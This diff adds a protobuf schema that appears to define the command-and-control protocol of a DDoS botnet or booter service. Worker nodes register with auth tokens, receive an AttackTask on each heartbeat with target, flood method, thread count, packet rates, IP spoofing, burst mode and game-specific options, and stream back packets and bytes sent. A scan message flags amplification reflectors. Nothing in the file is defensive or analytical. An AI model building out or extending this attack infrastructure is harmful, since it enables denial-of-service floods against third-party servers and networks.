@@ -1,0 +1,111 @@
+syntax = "proto3";
+
+package nettool;
+
+option go_package = "newtool/internal/proto";
+
+service NodeService {
+  rpc Register(RegisterRequest) returns (RegisterResponse);
+  rpc Deregister(DeregisterRequest) returns (DeregisterResponse);
+  rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
+  rpc ReportStats(stream WorkerStatsPush) returns (StatsAck);
+}
+
+message RegisterRequest {
+  string worker_id = 1;
+  string auth_token = 2;
+  int32 cpu_cores = 3;
+  int64 memory_mb = 4;
+  int32 bandwidth_mbps = 5;
+  string location = 6;
+  repeated string tags = 7;
+  bool is_windows = 8;
+}
+
+message RegisterResponse {
+  bool success = 1;
+  string message = 2;
+  string assigned_id = 3;
+}
+
+message DeregisterRequest {
+  string worker_id = 1;
+  string auth_token = 2;
+}
+
+message DeregisterResponse {
+  bool ok = 1;
+}
+
+message HeartbeatRequest {
+  string worker_id = 1;
+  string auth_token = 2;
+  double cpu_percent = 3;
+  int64 memory_used_mb = 4;
+  int32 network_mbps = 5;
+}
+
+message HeartbeatResponse {
+  bool ok = 1;
+  AttackTask pending_task = 2;
+  string cancel_task_id = 3;
+}
+
+message AttackTask {
+  string task_id = 1;
+  string target = 2;
+  string method = 3;
+  int32 duration = 4;
+  int32 threads = 5;
+  int32 packet_size = 6;
+  bool mix = 7;
+  string game = 8;
+  int64 rate_limit_pps = 9;
+  int64 rate_limit_bps = 10;
+  bool burst_mode = 12;
+  int32 jitter_ms = 13;
+  repeated SubAttack sub_attacks = 14;
+  bool spoof_ip = 15;
+  bool fallback_to_udp = 16;
+}
+
+message SubAttack {
+  string method = 1;
+  int32 threads = 2;
+  int32 packet_size = 3;
+  int64 rate_limit_pps = 4;
+  int64 rate_limit_bps = 5;
+  string game = 6;
+  bool burst_mode = 7;
+  int32 jitter_ms = 8;
+}
+
+message WorkerStatsPush {
+  string task_id = 1;
+  string worker_id = 2;
+  uint64 packets_sent = 3;
+  uint64 bytes_sent = 4;
+  uint64 errors = 5;
+  uint64 current_pps = 6;
+  uint64 current_bps = 7;
+  double elapsed_seconds = 8;
+  bool finished = 9;
+  string error_msg = 10;
+}
+
+message StatsAck {
+  bool ok = 1;
+}
+
+message ScanRequest {
+  string ip = 1;
+  int32 port = 2;
+}
+
+message ScanResult {
+  string ip = 1;
+  int32 port = 2;
+  int32 response_size = 3;
+  string server_name = 4;
+  bool is_reflector = 5;
+}
